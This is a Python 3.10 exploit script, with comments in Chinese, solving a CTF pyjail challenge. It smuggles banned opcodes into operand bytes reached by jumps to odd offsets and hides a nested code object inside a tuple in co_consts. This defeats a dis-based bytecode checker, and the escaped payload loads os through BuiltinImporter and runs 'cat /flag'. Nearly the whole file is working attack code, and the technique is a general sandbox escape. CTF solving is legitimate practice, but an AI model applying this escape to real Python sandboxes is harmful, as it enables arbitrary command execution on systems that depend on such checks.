#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
pyjail-ez??! (HTUCTF #83) —— 字节码走私 (jump-into-operand)

jail 约束（Python 3.10）:
  - 禁用 opcode: IMPORT_NAME/FROM/STAR, LOAD_NAME/STORE_NAME/DELETE_NAME,
    LOAD_GLOBAL/STORE_GLOBAL/DELETE_GLOBAL, LOAD_FAST/STORE_FAST/DELETE_FAST,
    LOAD_CLOSURE, LOAD_BUILD_CLASS, LOAD_ASSERTION_ERROR, LOAD_METHOD,
    LOAD_ATTR, MAKE_FUNCTION, CALL_METHOD
  - co.co_names 必须为空  -> 所有依赖 co_names 的指令(LOAD_ATTR/IMPORT_NAME...)即使走私了也取不到名字
  - co_nlocals == 0 且 co_varnames 为空
  - co_consts 里不能有 CodeType
  - len(co_code) <= 1024

思路:
  1) dis.get_instructions() 按 2 字节步进解析，只把"偶数 offset"当 opcode。
     若用 JUMP_ABSOLUTE 跳到**奇数 offset**，解释器就会把原本的"操作数字节"
     当成 opcode 执行 —— 被禁指令因此可以藏进 dis 看不到的地方。
  2) co_consts 里把真正的恶意 code object 藏在 tuple 中
     （check 只判断 co_consts 的直接元素是否为 CodeType）。
  3) 走私 MAKE_FUNCTION + CALL_FUNCTION 把嵌套 code 变成函数并执行；
     嵌套 code 拥有自己的 co_names，不受任何限制。

必须在 Python 3.10 下生成 payload（marshal 版本 + opcode 需一致）。
"""
import base64
import marshal
import sys

# ---- 真正要执行的代码（在嵌套 code object 里，不受 jail 检查）----
PAYLOAD = r"""
for c in ().__class__.__base__.__subclasses__():
    if c.__name__ == 'BuiltinImporter':
        c.load_module('os').system('cat /flag')
        break
"""

# opcode (Python 3.10)
JUMP_ABSOLUTE = 113
POP_TOP = 1
LOAD_CONST = 100
UNPACK_SEQUENCE = 92
MAKE_FUNCTION = 132
CALL_FUNCTION = 131
RETURN_VALUE = 83

# 偶数 offset 是 dis 看到的"无害指令"，奇数 offset 才是真正执行的指令
CODE = bytes([
    JUMP_ABSOLUTE, 3,          # 0: dis 看到 JUMP_ABSOLUTE 3（无害），实际跳到 offset 3
    POP_TOP, LOAD_CONST,       # 2: dis 看到 POP_TOP 100      -> 执行 3: LOAD_CONST
    0, UNPACK_SEQUENCE,        # 4: dis 看到 <0> 92           -> 执行 5: UNPACK_SEQUENCE
    1, MAKE_FUNCTION,          # 6: dis 看到 POP_TOP 132     -> 执行 7: MAKE_FUNCTION
    0, CALL_FUNCTION,          # 8: dis 看到 <0> 131          -> 执行 9: CALL_FUNCTION
    0, RETURN_VALUE,            # 10: dis 看到 <0> 83         -> 执行 11: RETURN_VALUE
    0, 0,
])


def build(payload_src=PAYLOAD):
    nested = compile(payload_src, '<nested>', 'exec')
    tpl = compile('0', '<tpl>', 'eval')
    top = tpl.replace(
        co_code=CODE,
        co_consts=((nested,),),      # 藏在 tuple 里，绕过 "co_consts 不能有 CodeType"
        co_names=(),
        co_varnames=(),
        co_nlocals=0,
        co_stacksize=8,
        co_filename='<tpl>',
        co_name='<tpl>',
    )
    return top


def selfcheck(co, verbose=False):
    """复刻 jail 的 check()，确认能通过"""
    import dis
    import types
    BANNED = {
        "IMPORT_NAME", "IMPORT_FROM", "IMPORT_STAR",
        "LOAD_NAME", "STORE_NAME", "DELETE_NAME",
        "LOAD_GLOBAL", "STORE_GLOBAL", "DELETE_GLOBAL",
        "LOAD_FAST", "STORE_FAST", "DELETE_FAST", "LOAD_CLOSURE",
        "LOAD_BUILD_CLASS", "LOAD_ASSERTION_ERROR", "LOAD_METHOD", "LOAD_ATTR",
        "MAKE_FUNCTION", "CALL_METHOD",
    }
    assert type(co) is types.CodeType
    assert len(co.co_code) <= 1024
    assert not co.co_names, "names must be empty"
    assert co.co_nlocals == 0 and not co.co_varnames
    assert not any(isinstance(c, types.CodeType) for c in co.co_consts)
    ops = []
    for ins in dis.get_instructions(co):
        ops.append(ins.opname)
        assert ins.opname not in BANNED, "banned opcode: " + ins.opname
    if verbose:
        print("dis 看到的指令流:", ops)
    return ops


def main():
    if sys.version_info[:2] != (3, 10):
        sys.exit("must run under Python 3.10")
    co = build()
    print("dis 视角 opcode:", selfcheck(co, verbose=True))
    blob = base64.b64encode(marshal.dumps(co))
    print("payload len:", len(blob))
    open('payload.txt', 'wb').write(blob)
    print(blob.decode())


if __name__ == '__main__':
    main()
